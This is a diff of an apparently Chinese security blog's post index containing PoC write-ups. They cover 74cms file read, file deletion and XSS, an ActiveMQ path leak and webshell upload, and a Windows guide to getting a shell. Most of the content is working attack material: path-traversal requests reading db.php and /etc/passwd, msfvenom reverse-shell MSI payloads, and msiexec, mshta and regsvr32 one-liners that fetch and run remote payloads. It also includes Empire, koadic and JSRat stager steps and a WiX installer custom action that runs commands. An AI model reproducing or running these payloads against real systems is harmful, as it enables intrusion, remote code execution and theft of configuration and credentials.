+<p>保存该图片用文本打开就是 db.php 的内容。</p>
+<h6 id="PS"><a href="#PS" class="headerlink" title="PS:"></a>PS:</h6><p>使用post提交，参数如下</p>
+<p>5.png</p>
+<p>在Header可获取到时间戳</p>
+<p>6.png</p>
+<h3 id="可能会遇到的问题"><a href="#可能会遇到的问题" class="headerlink" title="可能会遇到的问题"></a>可能会遇到的问题</h3><h6 id="post数据返回unicode编码"><a href="#post数据返回unicode编码" class="headerlink" title="post数据返回unicode编码"></a>post数据返回unicode编码</h6><p>因为名称，密码，ID等内容格式不对或重复会出现这种情况，将unicode编码进行解码，按提示修改即可。</p>
+<h6 id="读取其他文件"><a href="#读取其他文件" class="headerlink" title="读取其他文件"></a>读取其他文件</h6><p>../../../../Application/Common/Conf/db.php</p>
+<p>是读取db.php，如果想读取根目录可以构造</p>
+<p>../../../../../../../../etc/passwd</p>
+<h6 id="时间戳问题"><a href="#时间戳问题" class="headerlink" title="时间戳问题"></a>时间戳问题</h6><p>服务器返回的时间，服务器返回的是GMT格林威治标准时间，没有加上时区，只记录分秒即可</p>
 ]]></content>
       <categories>
         <category>Poc</category>
@@ -421,84 +486,6 @@ if __name__ == &#39;__main__&#39;:
             for day in range(1, 31):
                 time = (str(year) + str(&#39;%02d&#39; % mouth) + str(&#39;%02d&#39; % day))
                 getBak(time)</code></pre>
-]]></content>
-      <categories>
-        <category>Poc</category>
-      </categories>
-      <tags>
-        <tag>74cms</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>74cms v4.2.3 任意文件删除</title>
-    <url>/2021/01/12/74cms%20v4.2.3%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/</url>
-    <content><![CDATA[<h1 id="74cms-v4-2-3-任意文件删除"><a href="#74cms-v4-2-3-任意文件删除" class="headerlink" title="74cms v4.2.3 任意文件删除"></a>74cms v4.2.3 任意文件删除</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介<a id="more"></a></h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><pre><code>GET /index.php?m=admin&amp;c=database&amp;a=del&amp;name=/../../../../../ HTTP/1.1
-Host: 0-sec.org
-User-Agent: Mozilla/5.0 (Android 9.0; Mobile; rv:61.0) Gecko/61.0 Firefox/61.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: en
-Accept-Encoding: gzip, deflate
-Referer: http://127.0.0.1/index.php?m=admin&amp;c=database&amp;a=restore
-Connection: close
-Cookie: think_template=default; PHPSESSID=6d86a34ec9125b2d08ebbb7630838682; think_language=en
-Upgrade-Insecure-Requests: 1</code></pre>
-]]></content>
-      <categories>
-        <category>Poc</category>
-      </categories>
-      <tags>
-        <tag>74cms</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>74cms v4.2.3任意文件读取</title>
-    <url>/2021/01/12/74cms%20v4.2.3%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/</url>
-    <content><![CDATA[<h1 id="74cms-v4-2-3任意文件读取"><a href="#74cms-v4-2-3任意文件读取" class="headerlink" title="74cms v4.2.3任意文件读取"></a>74cms v4.2.3任意文件读取</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>74cms v4.2.3<a id="more"></a></p>
-<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>先尝试读取 db.php，向服务器post如下数据</p>
-<pre><code>POST /index.php?m=&amp;c=members&amp;a=register HTTP/1.1
-Host: www.0-sec.org
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36 
-Accept-Encoding: gzip, deflate
-Accept: */*
-Connection: keep-alive
-Cookie: members_bind_info[temp_avatar]=../../../../Application/Common/Conf/db.php; members_bind_info[type]=qq; members_uc_info[password]=xcxmiku; members_uc_info[uid]=123456; members_uc_info[username]=xcxmiku
-Content-Type: application/x-www-form-urlencoded
-
-ajax=1&amp;reg_type=2&amp;utype=2&amp;org=bind&amp;ucenter=bind</code></pre>
-<p>会返回如下数据</p>
-<p>1.png</p>
-<p>在/data/upload/avatar/年月/日文件夹下 会生成一张图片</p>
-<p>2.png</p>
-<p>这张图片的名称由id和时间戳的md5值构成，我们可以将Burp<br>Suite上返回的时间转换为时间戳</p>
-<p>3.png</p>
-<p>不过这个时间可能会有误差，如果不行就把时间+-10</p>
-<p>我post的id为654321，获取的时间戳为1571659588，将他们连在一起进行md5加密</p>
-<p>4.png</p>
-<p>成功获取图片名，然后访问</p>
-<pre><code>https://www.0-sec.org/data/upload/avatar/1910/21/9aaa3653bf6ec9491bc002b52521962c.jpg </code></pre>
-<p>保存该图片用文本打开就是 db.php 的内容。</p>
-<h6 id="PS"><a href="#PS" class="headerlink" title="PS:"></a>PS:</h6><p>使用post提交，参数如下</p>
-<p>5.png</p>
-<p>在Header可获取到时间戳</p>
-<p>6.png</p>
-<h3 id="可能会遇到的问题"><a href="#可能会遇到的问题" class="headerlink" title="可能会遇到的问题"></a>可能会遇到的问题</h3><h6 id="post数据返回unicode编码"><a href="#post数据返回unicode编码" class="headerlink" title="post数据返回unicode编码"></a>post数据返回unicode编码</h6><p>因为名称，密码，ID等内容格式不对或重复会出现这种情况，将unicode编码进行解码，按提示修改即可。</p>
-<h6 id="读取其他文件"><a href="#读取其他文件" class="headerlink" title="读取其他文件"></a>读取其他文件</h6><p>../../../../Application/Common/Conf/db.php</p>
-<p>是读取db.php，如果想读取根目录可以构造</p>
-<p>../../../../../../../../etc/passwd</p>
-<h6 id="时间戳问题"><a href="#时间戳问题" class="headerlink" title="时间戳问题"></a>时间戳问题</h6><p>服务器返回的时间，服务器返回的是GMT格林威治标准时间，没有加上时区，只记录分秒即可</p>
-]]></content>
-      <categories>
-        <category>Poc</category>
-      </categories>
-      <tags>
-        <tag>74cms</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>74cms v6.0.4 反射型xss</title>
-    <url>/2021/01/12/74cms%20v6.0.4%20%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/</url>
-    <content><![CDATA[<h1 id="74cms-v6-0-4-反射型xss"><a href="#74cms-v6-0-4-反射型xss" class="headerlink" title="74cms v6.0.4 反射型xss"></a>74cms v6.0.4 反射型xss</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>74cms v6.0.4<a id="more"></a></p>
-<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><pre><code>http://www.0-sec.org/index.php?m=&amp;c=help&amp;a=help_list&amp;key=137244gq1lw%253cscript%253ealert%25281%2529%253c%252fscript%253edutvxlqd4lq&amp;__hash__=d7aa5a382f14d270c3ac4de8392b4e1d_a34adb2b339972672eb447276f69ee88</code></pre>
 ]]></content>
       <categories>
         <category>Poc</category>
@@ -722,23 +709,6 @@ Cache-Control: max-age=0</code></pre>
       </tags>
   </entry>
   <entry>
-    <title>ActiveMQ物理路径泄漏漏洞</title>
-    <url>/2021/01/12/ActiveMQ%E7%89%A9%E7%90%86%E8%B7%AF%E5%BE%84%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h1 id="ActiveMQ物理路径泄漏漏洞"><a href="#ActiveMQ物理路径泄漏漏洞" class="headerlink" title="ActiveMQ物理路径泄漏漏洞"></a>ActiveMQ物理路径泄漏漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>ActiveMQ默认开启PUT请求，当开启PUT时，构造好Payload(即不存在的目录)，Response会返回相应的物理路径信<a id="more"></a>息</p>
-<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><pre><code>Request Raw:
-PUT /fileserver/a../../%08/..%08/.%08/%08 HTTP/1.1
-Host: 192.168.197.25:8161
-Authorization: Basic YWRtaW46YWRtaW4=
-Content-Length: 4</code></pre>
-]]></content>
-      <categories>
-        <category>Poc</category>
-      </categories>
-      <tags>
-        <tag>ActiveMQ</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>74cms v6.0.48模版注入+文件包含getshell</title>
     <url>/2021/01/12/74cms%20v6.0.48%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/</url>
     <content><![CDATA[<h1 id="74cms-v6-0-48模版注入-文件包含getshell"><a href="#74cms-v6-0-48模版注入-文件包含getshell" class="headerlink" title="74cms v6.0.48模版注入+文件包含getshell"></a>74cms v6.0.48模版注入+文件包含getshell</h1><h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>骑士cms人才系<a id="more"></a>统，是一项基于PHP+MYSQL为核心开发的一套<strong>免费 +</strong> 开源专业人才网站系统。软件具执行效率高、模板自由切换、后台管理功能方便等诸多优秀特点。</p>
@@ -768,67 +738,79 @@ Content-Length: 4</code></pre>
       </tags>
   </entry>
   <entry>
-    <title>在命令执行的情况下上线的几种方式-Windows</title>
-    <url>/2021/01/13/%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F-Windows/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言<a id="more"></a></h1>]]></content>
-      <categories>
-        <category>技巧</category>
-      </categories>
-      <tags>
-        <tag>Windows</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>（CVE-2016-3088）ActiveMQ应用漏洞</title>
-    <url>/2021/01/12/%EF%BC%88CVE-2016-3088%EF%BC%89ActiveMQ%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h1 id="（CVE-2016-3088）ActiveMQ应用漏洞"><a href="#（CVE-2016-3088）ActiveMQ应用漏洞" class="headerlink" title="（CVE-2016-3088）ActiveMQ应用漏洞"></a>（CVE-2016-3088）ActiveMQ应用漏洞</h1><a id="more"></a>
-
-<h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>ActiveMQ是一款流行的开源消息服务器。默认情况下，ActiveMQ服务是没有配置安全参数。恶意人员可以利用默认配置弱点发动远程命令执行攻击，获取服务器权限，从而导致数据泄露。</p>
-<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Apache ActiveMQ 5.x ~ 5.14.0</p>
-<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>漏洞是需要登录之后才可以执行</p>
-<p>漏洞利用就是/fileserver/有put上传权限，/admin/有执行权限，可找到绝对路径，使用move移动文件到/admin/</p>
-<p>下面就是两步走，先是利用put上传文件到/fileserver/,然后移动到move到admin下面</p>
-<p>所有返回为204就代表是成功，有个坑点：不要put同文件名的文件上去</p>
-<p>如果上传不解析的话，则是证明没有权限！！！</p>
-<p>如果上传不解析的话，则是证明没有权限！！！</p>
-<p>如果上传不解析的话，则是证明没有权限！！！</p>
-<p>ActiveMQ默认开启PUT方法，当fileserver存在时我们可以上传jspwebshell。</p>
-<p><img src="./images/(CVE-2016-3088)ActiveMQ%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/media/rId24.png"></p>
-<pre><code>PUT /fileserver/shell.jsp HTTP/1.1
+    <title>ActiveMQ物理路径泄漏漏洞</title>
+    <url>/2021/01/12/ActiveMQ%E7%89%A9%E7%90%86%E8%B7%AF%E5%BE%84%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="ActiveMQ物理路径泄漏漏洞"><a href="#ActiveMQ物理路径泄漏漏洞" class="headerlink" title="ActiveMQ物理路径泄漏漏洞"></a>ActiveMQ物理路径泄漏漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>ActiveMQ默认开启PUT请求，当开启PUT时，构造好Payload(即不存在的目录)，Response会返回相应的物理路径信<a id="more"></a>息</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><pre><code>Request Raw:
+PUT /fileserver/a../../%08/..%08/.%08/%08 HTTP/1.1
 Host: 192.168.197.25:8161
-User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
-Accept-Encoding: gzip, deflate
-Connection: keep-alive
-Upgrade-Insecure-Requests: 1
 Authorization: Basic YWRtaW46YWRtaW4=
-
-shell</code></pre>
-<p>利用 MOVE 方法将 Webshell 移入 admin/ 目录</p>
-<p><img src="./images/(CVE-2016-3088)ActiveMQ%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/media/rId25.png"></p>
-<pre><code>Request Raw:
-MOVE /fileserver/shell.jsp HTTP/1.1
-Destination:file:/data/apache-activemq-5.7.0/webapps/admin/shell.jsp
-Host: 192.168.197.25:8161
-User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
-Accept-Encoding: gzip, deflate
-Connection: keep-alive
-Upgrade-Insecure-Requests: 1
-Authorization: Basic YWRtaW46YWRtaW4=
-Content-Length: 17
-Content-Length: 0
-
-shell</code></pre>
-<p><img src="./images/(CVE-2016-3088)ActiveMQ%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/media/rId26.png"></p>
+Content-Length: 4</code></pre>
 ]]></content>
       <categories>
         <category>Poc</category>
       </categories>
       <tags>
-        <tag>ApacheMQ</tag>
+        <tag>ActiveMQ</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>74cms v6.0.4 反射型xss</title>
+    <url>/2021/01/12/74cms%20v6.0.4%20%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/</url>
+    <content><![CDATA[<h1 id="74cms-v6-0-4-反射型xss"><a href="#74cms-v6-0-4-反射型xss" class="headerlink" title="74cms v6.0.4 反射型xss"></a>74cms v6.0.4 反射型xss</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>74cms v6.0.4<a id="more"></a></p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><pre><code>http://www.0-sec.org/index.php?m=&amp;c=help&amp;a=help_list&amp;key=137244gq1lw%253cscript%253ealert%25281%2529%253c%252fscript%253edutvxlqd4lq&amp;__hash__=d7aa5a382f14d270c3ac4de8392b4e1d_a34adb2b339972672eb447276f69ee88</code></pre>
+]]></content>
+      <categories>
+        <category>Poc</category>
+      </categories>
+      <tags>
+        <tag>74cms</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>在命令执行的情况下上线的几种方式-Windows</title>
+    <url>/2021/01/13/%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F-Windows/</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​        对Windows的系统，经常会出现可以执行命令，但无法上线或是拿shell的情况<a id="more"></a>。针对Windows的上线分为远程执行和本地运行，以下就两种利用方式把从各类技巧做一个汇总。</p>
+<hr>
+<h2 id="远程执行"><a href="#远程执行" class="headerlink" title="远程执行"></a>远程执行</h2><h3 id="mshta方式"><a href="#mshta方式" class="headerlink" title="mshta方式"></a>mshta方式</h3><h4 id="metaspolit模块"><a href="#metaspolit模块" class="headerlink" title="metaspolit模块"></a>metaspolit模块</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;misc&#x2F;hta_server</span><br><span class="line">mshta xxx</span><br><span class="line">执行mshta xxxxx</span><br></pre></td></tr></table></figure>
+<h4 id="配合CACTUSTORCH"><a href="#配合CACTUSTORCH" class="headerlink" title="配合CACTUSTORCH"></a>配合CACTUSTORCH</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">下载 https:&#x2F;&#x2F;github.com&#x2F;mdsecactivebreach&#x2F;CACTUSTORCH</span><br><span class="line">生成raw格式的shellcode并base64</span><br><span class="line">	base64从文件快速编码命令：cat 1.bin |base64 -w 0</span><br><span class="line">修改CACTUSTORCH.hta文件中Dim code处的内容为base64后的shellcode</span><br><span class="line">执行mshta http:&#x2F;&#x2F;x.x.x.x&#x2F;CACTUSTORCH.hta</span><br></pre></td></tr></table></figure>
+<h4 id="配合GreatSCT"><a href="#配合GreatSCT" class="headerlink" title="配合GreatSCT"></a>配合GreatSCT</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use Bypass</span><br><span class="line">use mshta&#x2F;shellcode_inject&#x2F;base64_migrate</span><br></pre></td></tr></table></figure>
+<h3 id="msiexec方式"><a href="#msiexec方式" class="headerlink" title="msiexec方式"></a>msiexec方式</h3><p>可以将msi后缀改为png</p>
+<h4 id="metaspolit模块-1"><a href="#metaspolit模块-1" class="headerlink" title="metaspolit模块"></a>metaspolit模块</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.1.107 lport&#x3D;1234 –f msi &gt; shell.msi</span><br><span class="line">msiexec &#x2F;q &#x2F;i http:&#x2F;&#x2F;x.x.x.x&#x2F;shell.msi</span><br></pre></td></tr></table></figure>
+<h4 id="自编译msi"><a href="#自编译msi" class="headerlink" title="自编译msi"></a>自编译msi</h4><p>修改恶意msi.wix文件中要执行的命令</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Wix</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://schemas.microsoft.com/wix/2006/wi&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Product</span> <span class="attr">Id</span>=<span class="string">&quot;*&quot;</span> <span class="attr">UpgradeCode</span>=<span class="string">&quot;12345678-1234-1234-1234-111111111111&quot;</span> <span class="attr">Name</span>=<span class="string">&quot;Example Product </span></span></span><br><span class="line"><span class="tag"><span class="string">Name&quot;</span> <span class="attr">Version</span>=<span class="string">&quot;0.0.1&quot;</span> <span class="attr">Manufacturer</span>=<span class="string">&quot;@_xpn_&quot;</span> <span class="attr">Language</span>=<span class="string">&quot;1033&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Package</span> <span class="attr">InstallerVersion</span>=<span class="string">&quot;200&quot;</span> <span class="attr">Compressed</span>=<span class="string">&quot;yes&quot;</span> <span class="attr">Comments</span>=<span class="string">&quot;Windows Installer Package&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Media</span> <span class="attr">Id</span>=<span class="string">&quot;1&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Directory</span> <span class="attr">Id</span>=<span class="string">&quot;TARGETDIR&quot;</span> <span class="attr">Name</span>=<span class="string">&quot;SourceDir&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Directory</span> <span class="attr">Id</span>=<span class="string">&quot;ProgramFilesFolder&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Directory</span> <span class="attr">Id</span>=<span class="string">&quot;INSTALLLOCATION&quot;</span> <span class="attr">Name</span>=<span class="string">&quot;Example&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">Component</span> <span class="attr">Id</span>=<span class="string">&quot;ApplicationFiles&quot;</span> <span class="attr">Guid</span>=<span class="string">&quot;12345678-1234-1234-1234-222222222222&quot;</span>&gt;</span>     </span><br><span class="line">          <span class="tag">&lt;/<span class="name">Component</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Feature</span> <span class="attr">Id</span>=<span class="string">&quot;DefaultFeature&quot;</span> <span class="attr">Level</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ComponentRef</span> <span class="attr">Id</span>=<span class="string">&quot;ApplicationFiles&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Feature</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Property</span> <span class="attr">Id</span>=<span class="string">&quot;cmdline&quot;</span>&gt;</span>calc</span><br><span class="line">    <span class="tag">&lt;/<span class="name">Property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">CustomAction</span> <span class="attr">Id</span>=<span class="string">&quot;SystemShell&quot;</span> <span class="attr">Execute</span>=<span class="string">&quot;deferred&quot;</span> <span class="attr">Directory</span>=<span class="string">&quot;TARGETDIR&quot;</span> </span></span><br><span class="line"><span class="tag"><span class="attr">ExeCommand</span>=<span class="string">&#x27;[cmdline]&#x27;</span> <span class="attr">Return</span>=<span class="string">&quot;ignore&quot;</span> <span class="attr">Impersonate</span>=<span class="string">&quot;no&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">CustomAction</span> <span class="attr">Id</span>=<span class="string">&quot;FailInstall&quot;</span> <span class="attr">Execute</span>=<span class="string">&quot;deferred&quot;</span> <span class="attr">Script</span>=<span class="string">&quot;vbscript&quot;</span> <span class="attr">Return</span>=<span class="string">&quot;check&quot;</span>&gt;</span></span><br><span class="line">      invalid vbs to fail install</span><br><span class="line">    <span class="tag">&lt;/<span class="name">CustomAction</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">InstallExecuteSequence</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Custom</span> <span class="attr">Action</span>=<span class="string">&quot;SystemShell&quot;</span> <span class="attr">After</span>=<span class="string">&quot;InstallInitialize&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">Custom</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Custom</span> <span class="attr">Action</span>=<span class="string">&quot;FailInstall&quot;</span> <span class="attr">Before</span>=<span class="string">&quot;InstallFiles&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">Custom</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">InstallExecuteSequence</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">Product</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Wix</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>使用wix工具编译生成msi.wix</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">candle.exe msi.wix</span><br><span class="line">light.exe xxx.wixobj</span><br></pre></td></tr></table></figure>
+<h4 id="exe转msi"><a href="#exe转msi" class="headerlink" title="exe转msi"></a>exe转msi</h4><p>使用exe2msi.msi工具将exe转为msi</p>
+<p>如果exe是免杀的，那么这样一来就可以无需exe落地就能远程执行</p>
+<h3 id="regsvr32方式"><a href="#regsvr32方式" class="headerlink" title="regsvr32方式"></a>regsvr32方式</h3><h4 id="配合metaspolit模块"><a href="#配合metaspolit模块" class="headerlink" title="配合metaspolit模块"></a>配合metaspolit模块</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;script&#x2F;web_delivery</span><br><span class="line">regsvr32 &#x2F;s &#x2F;n &#x2F;u &#x2F;i:http:&#x2F;&#x2F;x.x.x.x&#x2F;file.sct scrobj.dll</span><br></pre></td></tr></table></figure>
+<h4 id="配合empire"><a href="#配合empire" class="headerlink" title="配合empire"></a>配合empire</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uselistner http			#开启监听</span><br><span class="line">set Host http:&#x2F;&#x2F;192.168.1.109 #设置监听地址</span><br><span class="line">execute		#运行监听</span><br><span class="line">usestager windows&#x2F;launcher_sct  #选择模块</span><br><span class="line">set listener http	#选择监听</span><br><span class="line">execute		#运行模块</span><br><span class="line">regsvr &#x2F;s &#x2F;n &#x2F;u &#x2F;i:http:&#x2F;&#x2F;192.168.1.109:8080&#x2F;tmp&#x2F;launcher.sct scrobj.dll</span><br></pre></td></tr></table></figure>
+<h4 id="自定义SCT文件"><a href="#自定义SCT文件" class="headerlink" title="自定义SCT文件"></a>自定义SCT文件</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?XML version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scriptlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">registration</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">progid</span>=<span class="string">&quot;PoC&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">classid</span>=<span class="string">&quot;&#123;F0001111-0000-0000-0000-0000FEEDACDC&#125;&quot;</span> &gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- Proof Of Concept - Casey Smith @subTee --&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--  License: BSD3-Clause --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;JScript&quot;</span>&gt;</span></span><br><span class="line">		&lt;![CDATA[</span><br><span class="line">	</span><br><span class="line"><span class="javascript">			<span class="keyword">var</span> r = <span class="keyword">new</span> ActiveXObject(<span class="string">&quot;WScript.Shell&quot;</span>).Run(<span class="string">&quot;calc.exe&quot;</span>);	</span></span><br><span class="line">	</span><br><span class="line">		]]&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">registration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">scriptlet</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>执行：regsvr32 /u /n /s /i:<a href="http://192.168.1.109/1.sct">http://192.168.1.109/1.sct</a> scrobj.dll</p>
+<h4 id="配合koadic"><a href="#配合koadic" class="headerlink" title="配合koadic"></a>配合koadic</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use stager&#x2F;js&#x2F;regsvr</span><br><span class="line">set srvhost 192.168.1.107</span><br><span class="line">run</span><br><span class="line">regsvr32 &#x2F;u &#x2F;n &#x2F;s &#x2F;i:http;&#x2F;&#x2F;192.168.1.107:9998&#x2F;uWBjv scrobj.dll</span><br><span class="line">zombies 0</span><br></pre></td></tr></table></figure>
+<h4 id="配合JSRat"><a href="#配合JSRat" class="headerlink" title="配合JSRat"></a>配合JSRat</h4><p>下载<a href="https://github.com/Hood3dRob1n/JSRat-Py">https://github.com/Hood3dRob1n/JSRat-Py</a></p>
+<p>在本机执行./JSRat.py -I 0.0.0.0 -p 9999后，脚本会自动生成命令</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">JSRat Server - Python Implementation</span><br><span class="line">By: Hood3dRob1n</span><br><span class="line"></span><br><span class="line">[*] Web Server Started on Port: 9999</span><br><span class="line">[*] Awaiting Client Connection to:</span><br><span class="line">   [*] rundll32 invocation: http:&#x2F;&#x2F;0.0.0.0:9999&#x2F;connect</span><br><span class="line">   [*] regsvr32 invocation: http:&#x2F;&#x2F;0.0.0.0:9999&#x2F;file.sct</span><br><span class="line">      [*] Client Command at: http:&#x2F;&#x2F;0.0.0.0:9999&#x2F;wtf</span><br><span class="line">      [*] Browser Hook Set at: http:&#x2F;&#x2F;0.0.0.0:9999&#x2F;hook</span><br><span class="line"></span><br><span class="line">[-] Hit CTRL+C to Stop the Server at any time...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
